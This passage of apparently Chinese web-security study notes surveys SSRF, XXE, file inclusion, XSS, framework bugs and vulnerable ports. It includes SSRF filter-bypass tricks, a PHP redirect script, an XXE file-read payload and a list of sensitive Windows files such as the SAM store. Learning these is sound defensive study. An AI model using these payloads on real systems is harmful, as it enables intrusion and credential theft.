title=\"3.文件上传\"></a>3.文件上传</h3><p><strong>文件上传的危害？</strong></p>\n<blockquote>\n<p>文件上传漏洞危害极大因为可以直接上传恶意代码到服务器上，可能会造成服务器的<strong>网页篡改、网站被挂马、服务器被远程控制、被安装后门等严重的后果</strong></p>\n</blockquote>\n<p><strong>文件上传怎么防御</strong></p>\n<ul>\n<li>客户端检测检测（js检测）</li>\n<li>服务端检测(MIME检测)</li>\n<li>服务端检测（扩展名检测）</li>\n<li>增加白名单</li>\n</ul>\n<p><strong>文件上传怎么绕过(白名单，黑名单，前端等)？</strong></p>\n<ul>\n<li>.htaccess绕过</li>\n<li>.user.ini绕过</li>\n<li>%00截断绕过</li>\n</ul>\n<h3 id=\"3-SSRF漏洞\"><a href=\"#3-SSRF漏洞\" class=\"headerlink\" title=\"3.SSRF漏洞\"></a>3.SSRF漏洞</h3><blockquote>\n<p>漏洞原理 <strong>SSRF</strong>（Server-Side Request  Forgery，服务器端请求伪造）是一种由攻击者构造请求，由服务器端发起请求的安全漏洞，本质上是属于信息泄露漏洞。  ssrf攻击的目标是从外网无法访问的内部系统（正是因为他是有服务器端发起的，所以他能够请求到与他相连而与外网隔离的内部系统）  很多web应用都提供了从其他的服务器上获取数据的功能（百度识图，给出一串URL就能识别出图片）。  使用用户指定的URL，web应用可以获取图片，下载文件，读取文件内容等。  这个功能如果被恶意使用，可以利用存在缺陷的web应用作为代理，攻击远程和本地的服务器。 一般情况下，  SSRF攻击的目标是外网无法访问的内部系统，黑客可以利用SSRF漏洞获取内部系统的一些信息 。</p>\n</blockquote>\n<p><strong>ssrf漏洞利用</strong></p>\n<ul>\n<li>能扫描内部网络，获取端口，服务信息</li>\n<li>攻击运行在内网或本地的应用程序。</li>\n<li>对内网web进行指纹识别</li>\n<li>对内部主机和端口发送请求包进行攻击</li>\n<li>file协议读取本地文件</li>\n</ul>\n<p><strong>Ssrf漏洞防御</strong></p>\n<ul>\n<li>限制请求的端口只能为Web端口，只允许访问HTTP和HTTPS的请求</li>\n<li>限制不能访问内网的IP，以防止对内网进行攻击</li>\n<li>屏蔽返回的详细信息</li>\n</ul>\n<p><strong>Ssrf漏洞绕过</strong></p>\n<ul>\n<li><p>@符号绕过</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.xxx.com@www.kxsy.work/</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>IP地址转换</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">例如：120.26.86.156</span><br><span class=\"line\">二进制 = 1111000000110100101011010011100</span><br><span class=\"line\">十六进制 = 0x781A569C</span><br><span class=\"line\">十进制 = 2014992028</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>转换短网址</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://www.985.so/</span><br><span class=\"line\">例：http://www.kxsy.work/ = http://u6.gg/ks69x</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>特殊符号替换绕过</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">例：</span><br><span class=\"line\">http://www.kxsy.work/ = http://www。kxsy。work/</span><br><span class=\"line\">localhost或者0.0.0.0</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>302跳转绕过</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php  </span><br><span class=\"line\">$schema = $_GET[&#x27;s&#x27;];</span><br><span class=\"line\">$ip     = $_GET[&#x27;i&#x27;];</span><br><span class=\"line\">$port   = $_GET[&#x27;p&#x27;];</span><br><span class=\"line\">$query  = $_GET[&#x27;q&#x27;];</span><br><span class=\"line\">if(empty($port))&#123;  </span><br><span class=\"line\">    header(&quot;Location: $schema://$ip/$query&quot;); </span><br><span class=\"line\">&#125; else &#123;</span><br><span class=\"line\">    header(&quot;Location: $schema://$ip:$port/$query&quot;); </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>xio.ip绕过，会解析到子域</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://10.0.0.1.xip.io = 10.0.0.1</span><br><span class=\"line\">www.10.0.0.1.xip.io= 10.0.0.1</span><br><span class=\"line\">http://mysite.10.0.0.1.xip.io = 10.0.0.1</span><br><span class=\"line\">foo.http://bar.10.0.0.1.xip.io = 10.0.0.1</span><br><span class=\"line\">10.0.0.1.xip.name resolves to 10.0.0.1</span><br><span class=\"line\">www.10.0.0.2.xip.name resolves to 10.0.0.2</span><br><span class=\"line\">foo.10.0.0.3.xip.name resolves to 10.0.0.3</span><br><span class=\"line\">bar.baz.10.0.0.4.xip.name resolves to 10.0.0.4</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>用Enclosed alphanumerics绕过</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">利用Enclosed alphanumerics</span><br><span class=\"line\">ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ &gt;&gt;&gt; http://example.com</span><br></pre></td></tr></table></figure></li>\n</ul>\n<h3 id=\"4-XXE漏洞\"><a href=\"#4-XXE漏洞\" class=\"headerlink\" title=\"4.XXE漏洞\"></a>4.XXE漏洞</h3><p><strong>XXE漏洞原理</strong></p>\n<blockquote>\n<p>XXE全称为XML External Entity Injection即XMl外部实体注入漏洞</p>\n</blockquote>\n<p>XXE漏洞触发点往往是可以上传xml文件的位置，没有对xml文件进行过滤，导致可加载恶意外部文件和代码，造成任意文件读取，命令执行、内网端口扫描、攻击内网网站、发起Dos攻击等危害 要了解xxe漏洞，那么一定得先明白基础知识，了解xml文档的基础组成</p>\n<p><strong>XXE漏洞利用</strong></p>\n<p>在php环境下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$xml=simplexml_load_string($_GET[&#x27;xml&#x27;]);</span><br><span class=\"line\">print_r($xml);</span><br><span class=\"line\">?&gt;\t</span><br></pre></td></tr></table></figure>\n\n<p>将以下xml代码进行URL编码，读取文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE playwin [</span><br><span class=\"line\">&lt;!ENTITY name SYSTEM &quot;file:///D:/phpStudy/PHPTutorial/WWW/1.txt&quot;&gt;</span><br><span class=\"line\">]&gt;</span><br><span class=\"line\">&lt;resume&gt;</span><br><span class=\"line\">&lt;name&gt; &amp;name; &lt;/name&gt;</span><br><span class=\"line\">&lt;/resume&gt;</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<p><strong>Xxe漏洞支持的伪协议</strong></p>\n<p>不同的程序支持协议不同</p>\n<h3 id=\"5-文件包含漏洞\"><a href=\"#5-文件包含漏洞\" class=\"headerlink\" title=\"5.文件包含漏洞\"></a>5.文件包含漏洞</h3><p><strong>文件包含的函数</strong></p>\n<p>php中有四种</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">require() // 只在执行到此函数时才去包含文件，若包含的文件不存在产生警告，程序继续运行</span><br><span class=\"line\"></span><br><span class=\"line\">require_once() // 如果一个文件已经被包含过，则不会在包含它</span><br><span class=\"line\"></span><br><span class=\"line\">include() // 程序一运行文件便会包含进来，若包含文件不存在产生致命错误，程序终止运行</span><br><span class=\"line\"></span><br><span class=\"line\">include_once() // 如果一个文件已经被包含过，则不会在包含它</span><br></pre></td></tr></table></figure>\n\n\n\n<p><strong>文件包含支持的伪协议</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">php的支持</span><br><span class=\"line\">php://filter</span><br><span class=\"line\">php://input</span><br><span class=\"line\">file://</span><br><span class=\"line\">phar://</span><br><span class=\"line\">zip://</span><br><span class=\"line\">data://</span><br></pre></td></tr></table></figure>\n\n\n\n<p><strong>文件包含利用</strong></p>\n<p>包含日志文件getshell</p>\n<p>包含敏感文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">C:\\boot.ini //查看系统版本</span><br><span class=\"line\">C:\\Windows\\System32\\inetsrv\\MetaBase.xml //IIS配置文件</span><br><span class=\"line\">C:\\Windows\\repair\\sam //存储系统初次安装的密码</span><br><span class=\"line\">C:\\Program Files\\mysql\\my.ini //Mysql配置</span><br><span class=\"line\">C:\\Program Files\\mysql\\data\\mysql\\user.MYD //Mysql root</span><br><span class=\"line\">C:\\Windows\\php.ini //php配置信息</span><br><span class=\"line\">C:\\Windows\\my.ini //Mysql配置信息</span><br><span class=\"line\">C:\\Windows\\win.ini //Windows系统的一个基本系统配置文件</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h3 id=\"6-Php命令执行，php代码执行相\"><a href=\"#6-Php命令执行，php代码执行相\" class=\"headerlink\" title=\"6.Php命令执行，php代码执行相\"></a>6.Php命令执行，php代码执行相</h3><p><strong>代码执行相关函数</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">assert()</span><br><span class=\"line\">eval()</span><br><span class=\"line\">call_user_func()</span><br><span class=\"line\">call_user_func_array()</span><br><span class=\"line\">preg_replace()  //7.0版本后已经不存在</span><br><span class=\"line\">array_map()</span><br><span class=\"line\">Usort()</span><br></pre></td></tr></table></figure>\n\n<p><strong>命令执行相关函数</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">system()</span><br><span class=\"line\">exec()</span><br><span class=\"line\">passthru()</span><br><span class=\"line\">shell_exec()</span><br><span class=\"line\">poopen()</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"7-XSS漏洞\"><a href=\"#7-XSS漏洞\" class=\"headerlink\" title=\"7.XSS漏洞\"></a>7.XSS漏洞</h3><p><strong>XSS漏洞原理</strong></p>\n<blockquote>\n<p>HTML是一种超文本标记语言，通过将一些字符特殊地对待来区别文本和标记，例如，小于符号（&lt;）被看作是HTML标签的开始。当动态页面中插入的内容含有这些特殊字符时，正好你要访问的服务器并没有对用户的输入进行安全方面的验证，用户浏览器会将其误认为是插入了HTML标签，当这些HTML标签引入了一段JavaScript脚本时，这些脚本程序就将会在用户浏览器中执行。所以，当这些特殊字符不能被动态页面检查或检查出现失误时，就将会产生XSS漏洞</p>\n</blockquote>\n<p><strong>xss漏洞类型</strong></p>\n<blockquote>\n<p>1.反射型</p>\n<p>反射型 XSS 一般是攻击者通过特定手法（如电子邮件），诱使用户去访问一个包含恶意代码的 URL，当受害者点击这些专门设计的链接的时候，恶意代码会直接在受害者主机上的浏览器执行。</p>\n<p>对于访问者而言是一次性的，具体表现在我们把我们的恶意脚本通过 URL 的方式传递给了服务器，而服务器则只是不加处理的把脚本“反射”回访问者的浏览器而使访问者的浏览器执行相应的脚本。反射型 XSS 的触发有后端的参与，要避免反射性 XSS，必须需要后端的协调，后端解析前端的数据时首先做相关的字串检测和转义处理。</p>\n<p>此类 XSS 通常出现在网站的搜索栏、用户登录口等地方，常用来窃取客户端 Cookies 或进行钓鱼欺骗。<br>2.存储型</p>\n<p>攻击者事先将恶意代码上传或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。这就意味着只要访问了这个页面的访客，都有可能会执行这段恶意脚本，因此储存型XSS的危害会更大。</p>\n<p>存储型 XSS 一般出现在网站留言、评论、博客日志等交互处，恶意脚本存储到客户端或者服务端的数据库中。<br>3.DOM型</p>\n<p>客户端的脚本程序可以动态地检查和修改页面内容，而不依赖于服务器端的数据。基于DOM的XSS，也就是web server不参与，仅仅涉及到浏览器的XSS。比如根据用户的例如客户端如从 URL 中提取数据并在本地执行，如果用户在客户端输入的数据包含了恶意的 JavaScript 脚本，而这些脚本没有经过适当的过滤和消毒，那么应用程序就可能受到 DOM-based XSS 攻击。需要特别注意以下的用户输入源 document.URL、 location.hash、 location.search、 document.referrer 等。</p>\n</blockquote>\n<p><strong>Dom型xss和反射型xss的区别</strong></p>\n<p>DOM型xss和别的xss最大的区别就是它不经过服务器，仅仅是通过网页本身的JavaScript进行渲染触发的</p>\n<p><strong>Xss漏洞的危害</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.窃取用户Cookie</span><br><span class=\"line\">2.后台增删改文章</span><br><span class=\"line\">3.XSS钓鱼攻击</span><br><span class=\"line\">4.利用XSS漏洞进行传播和修改网页代码</span><br><span class=\"line\">5.XSS蠕虫攻击</span><br><span class=\"line\">6.网站重定向</span><br><span class=\"line\">7.获取键盘记录</span><br><span class=\"line\">8.获取用户信息等</span><br></pre></td></tr></table></figure>\n\n\n\n<p><strong>XSS漏洞防御</strong></p>\n<blockquote>\n<p>1、对输入和URL参数进行过滤(白名单和黑名单)</p>\n<p>检查用户输入的数据中是否包含一些特殊字符，如&lt;、&gt;、’、“等，发现存在特殊字符，将这些特殊字符过滤或者编码。<br>2、HTML实体编码</p>\n<p>字符串js编码转换成实体html编码的方法（防范XSS攻击）<br><a class=\"link\"   href=\"https://www.cnblogs.com/dearxinli/p/5466286.html\" >https://www.cnblogs.com/dearxinli/p/5466286.html<i class=\"fas fa-external-link-alt\"></i></a><br>3、对输出内容进行编码</p>\n<p>在变量输出到HTML页面时，可以使用编码或转义的方式来防御XSS攻击。</p>\n</blockquote>\n<h3 id=\"8-常见的解析漏洞\"><a href=\"#8-常见的解析漏洞\" class=\"headerlink\" title=\"8.常见的解析漏洞\"></a>8.常见的解析漏洞</h3><p><strong>Nginx</strong></p>\n<blockquote>\n<p><a class=\"link\"   href=\"https://blog.csdn.net/Spontaneous_0/article/details/129106641\" >https://blog.csdn.net/Spontaneous_0/article/details/129106641<i class=\"fas fa-external-link-alt\"></i></a></p>\n</blockquote>\n<p><strong>Apache</strong></p>\n<blockquote>\n<p><a class=\"link\"   href=\"https://blog.csdn.net/weixin_44174581/article/details/119387616\" >https://blog.csdn.net/weixin_44174581/article/details/119387616<i class=\"fas fa-external-link-alt\"></i></a></p>\n</blockquote>\n<p><strong>lls</strong></p>\n<blockquote>\n<p><a class=\"link\"   href=\"https://blog.csdn.net/weixin_43625577/article/details/91971796\" >https://blog.csdn.net/weixin_43625577/article/details/91971796<i class=\"fas fa-external-link-alt\"></i></a></p>\n</blockquote>\n<h3 id=\"9-常见的漏扫工具支持扫描的漏洞类型\"><a href=\"#9-常见的漏扫工具支持扫描的漏洞类型\" class=\"headerlink\" title=\"9.常见的漏扫工具支持扫描的漏洞类型\"></a>9.常见的漏扫工具支持扫描的漏洞类型</h3><p> <strong>Xray</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">XSS漏洞检测 (key: xss)</span><br><span class=\"line\">SQL 注入检测 (key: sqldet)</span><br><span class=\"line\">命令/代码注入检测 (key: cmd-injection)</span><br><span class=\"line\">目录枚举 (key: dirscan)</span><br><span class=\"line\">路径穿越检测 (key: path-traversal)</span><br><span class=\"line\">XML 实体注入检测 (key: xxe)</span><br><span class=\"line\">文件上传检测 (key: upload)</span><br><span class=\"line\">弱口令检测 (key: brute-force)</span><br><span class=\"line\">jsonp 检测 (key: jsonp)</span><br><span class=\"line\">ssrf 检测 (key: ssrf)</span><br><span class=\"line\">基线检查 (key: baseline)</span><br><span class=\"line\">任意跳转检测 (key: redirect)</span><br><span class=\"line\">CRLF 注入 (key: crlf-injection)</span><br><span class=\"line\">Struts2 系列漏洞检测 (高级版，key: struts)</span><br><span class=\"line\">Thinkphp系列漏洞检测 (高级版，key: thinkphp)</span><br><span class=\"line\">POC 框架 (key: phantasm)</span><br></pre></td></tr></table></figure>\n\n<p>Avws</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.WebScanner：全站扫描，Web安全漏洞扫描</span><br><span class=\"line\">2.Site Crawler：爬虫功能，遍历站点目录结构</span><br><span class=\"line\">3.Target Finder：端口扫描，找出web服务器</span><br><span class=\"line\">4.Subdomain Scanner：子域名扫描器，利用DNS查询</span><br><span class=\"line\">5.Blind SQL Injector：盲注工具</span><br><span class=\"line\">6.HTTP Editor：http协议数据包编辑器</span><br><span class=\"line\">7.HTTP Sniffer：HTTP协议嗅探器</span><br><span class=\"line\">8.HTTP Fuzzer：模糊测试工具</span><br><span class=\"line\">9.Authentication Tester：Web认证破解工具</span><br><span class=\"line\">10.Web Srevice Scanner：Web服务扫描器</span><br><span class=\"line\">11.Web Srevice Editor：Web服务编辑器</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"10-sqlmap工具参数的使用和含义\"><a href=\"#10-sqlmap工具参数的使用和含义\" class=\"headerlink\" title=\"10.sqlmap工具参数的使用和含义\"></a>10.sqlmap工具参数的使用和含义</h3><ul>\n<li><code>-v</code> 显示信息的级别，一共有六级：0：只显示python 错误和一些严重信息；1：显示基本信息（默认）；2：显示debug信息；3：显示注入过程的payload；4：显示http请求包；5：显示http响应头；7：显示http相应页面</li>\n<li><code>-u</code>指定一个url连接，url中必须要有 <code>?xx=xxx</code> 才行</li>\n<li><code>-r</code>可以呀将一个post请求方式的数据保存在一个txt中msqlmap会通过post方式检验目标</li>\n<li><code>--data=Data</code>指明参数是哪些。例：<code>-u &quot;www.abc.com/index.php?id=1&quot; --data=&quot;name=1&amp;pass=2&quot;</code></li>\n<li><code>--random-agent</code>使用随机user-agent进行测试。sqlmap有一个文件中储存了各种各样的user-agent，文件在<code>sqlmap/txt/user-agent.txt</code> <strong>在level&gt;&#x3D;3时会检测user-agent注入。</strong></li>\n<li><code>--os-shell</code>创建一个对方操作系统的shell，metepreter或VNC</li>\n<li><code>--cookie</code>指定测试时使用的cookie，通常在一些需要登录的站点会使用。例： <code>-u &quot;www.abc.com/index.php?id=1&quot;</code></li>\n</ul>\n<h3 id=\"11-一些常见漏洞\"><a href=\"#11-一些常见漏洞\" class=\"headerlink\" title=\"11.一些常见漏洞\"></a>11.一些常见漏洞</h3><h5 id=\"Tomcat\"><a href=\"#Tomcat\" class=\"headerlink\" title=\"Tomcat\"></a><strong>Tomcat</strong></h5><p>任意命令执行</p>\n<p><a class=\"link\"   href=\"https://zhuanlan.zhihu.com/p/137686820\" >https://zhuanlan.zhihu.com/p/137686820<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h5 id=\"iis\"><a href=\"#iis\" class=\"headerlink\" title=\"iis\"></a>iis</h5><p>目录解析漏洞</p>\n<p>文件名解析漏洞</p>\n<p>畸形解析漏洞</p>\n<p>iis短文件漏洞</p>\n<p>PUT任意文件写入</p>\n<p><a class=\"link\"   href=\"https://blog.csdn.net/weixin_42918771/article/details/105178309\" >https://blog.csdn.net/weixin_42918771/article/details/105178309<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h5 id=\"apache\"><a href=\"#apache\" class=\"headerlink\" title=\"apache\"></a>apache</h5><p>换行解析漏洞，多后缀解析漏洞，http路径穿越漏洞</p>\n<p>，路径穿越漏洞</p>\n<p><a class=\"link\"   href=\"https://blog.csdn.net/weixin_44268918/article/details/129129214\" >https://blog.csdn.net/weixin_44268918/article/details/129129214<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><strong>Fastbin</strong></p>\n<p>跟pwn有关，暂时没弄懂</p>\n<p><a class=\"link\"   href=\"https://www.freebuf.com/articles/web/263598.html\" >https://www.freebuf.com/articles/web/263598.html<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h3 id=\"12-Cobalt-strike-mimikatz工具的一些基础知识\"><a href=\"#12-Cobalt-strike-mimikatz工具的一些基础知识\" class=\"headerlink\" title=\"12.Cobalt strike,mimikatz工具的一些基础知识\"></a>12.Cobalt strike,mimikatz工具的一些基础知识</h3><p>太多了，附上一个链接</p>\n<p><a class=\"link\"   href=\"https://www.freebuf.com/articles/network/290134.html\" >https://www.freebuf.com/articles/network/290134.html<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h3 id=\"13-常见框架漏洞\"><a href=\"#13-常见框架漏洞\" class=\"headerlink\" title=\"13.常见框架漏洞\"></a>13.常见框架漏洞</h3><h5 id=\"Jboss\"><a href=\"#Jboss\" class=\"headerlink\" title=\"Jboss\"></a>Jboss</h5><ul>\n<li><strong>访问控制不严导致的漏洞</strong></li>\n<li><strong>反序列化导致的漏洞</strong></li>\n</ul>\n<p><a class=\"link\"   href=\"https://blog.csdn.net/m0_58434634/article/details/117434173\" >https://blog.csdn.net/m0_58434634/article/details/117434173<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h5 id=\"weblogic\"><a href=\"#weblogic\" class=\"headerlink\" title=\"weblogic\"></a>weblogic</h5><ul>\n<li>弱口令漏洞</li>\n<li>任意文件上传漏洞</li>\n<li>XML Decoder反序列化漏洞</li>\n<li>webligic-SSRF漏洞</li>\n<li>java反序列化漏洞</li>\n</ul>\n<p><a class=\"link\"   href=\"https://www.cnblogs.com/-mo-/p/11503707.html\" >https://www.cnblogs.com/-mo-/p/11503707.html<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h5 id=\"thinkphp\"><a href=\"#thinkphp\" class=\"headerlink\" title=\"thinkphp\"></a>thinkphp</h5><ul>\n<li>远程代码执行漏洞</li>\n</ul>\n<p><a class=\"link\"   href=\"https://www.cnblogs.com/lingzhisec/p/15728886.html\" >https://www.cnblogs.com/lingzhisec/p/15728886.html<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h5 id=\"Struts2\"><a href=\"#Struts2\" class=\"headerlink\" title=\"Struts2\"></a>Struts2</h5><p><a class=\"link\"   href=\"https://blog.csdn.net/HBohan/article/details/122667891\" >https://blog.csdn.net/HBohan/article/details/122667891<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h5 id=\"Shiro\"><a href=\"#Shiro\" class=\"headerlink\" title=\"Shiro\"></a>Shiro</h5><ul>\n<li>反序列化漏洞</li>\n</ul>\n<p><a class=\"link\"   href=\"https://www.freebuf.com/vuls/283810.html\" >https://www.freebuf.com/vuls/283810.html<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h3 id=\"14-常见端口对应的漏洞\"><a href=\"#14-常见端口对应的漏洞\" class=\"headerlink\" title=\"14.常见端口对应的漏洞\"></a>14.常见端口对应的漏洞</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">20：FTP服务的数据传输端口</span><br><span class=\"line\">21：FTP服务的连接端口，可能存在  弱口令暴力破解</span><br><span class=\"line\">22：SSH服务端口，可能存在 弱口令暴力破解</span><br><span class=\"line\">23：Telnet端口，可能存在 弱口令暴力破解</span><br><span class=\"line\">25：SMTP简单邮件传输协议端口，和 POP3 的110端口对应</span><br><span class=\"line\">43：whois服务端口</span><br><span class=\"line\">53：DNS服务端口(TCP/UDP 53)</span><br><span class=\"line\">67/68：DHCP服务端口</span><br><span class=\"line\">69：TFTP端口，可能存在弱口令</span><br><span class=\"line\">80：HTTP端口，常见web漏洞</span><br><span class=\"line\">88：Kerberos协议端口</span><br><span class=\"line\">110：POP3邮件服务端口，和SMTP的25端口对应</span><br><span class=\"line\">135：RPC服务</span><br><span class=\"line\">137/138： NMB服务</span><br><span class=\"line\">139：SMB/CIFS服务</span><br><span class=\"line\">143：IMAP协议端口</span><br><span class=\"line\">161/162: Snmp服务，public弱口令</span><br><span class=\"line\">389：LDAP目录访问协议，有可能存在注入、弱口令，域控才会开放此端口</span><br><span class=\"line\">443：HTTPS端口，心脏滴血等与SSL有关的漏洞</span><br><span class=\"line\">445：SMB服务端口，可能存在永恒之蓝漏洞MS17-010</span><br><span class=\"line\">512/513/514：Linux Rexec服务端口，可能存在爆破</span><br><span class=\"line\">636：LDAPS目录访问协议，域控才会开放此端口</span><br><span class=\"line\">873：Rsync ，可能存在Rsync未授权访问漏洞，传送门：rsync 未授权访问漏洞</span><br><span class=\"line\">1080：socket端口，可能存在爆破</span><br><span class=\"line\">1099：RMI，可能存在 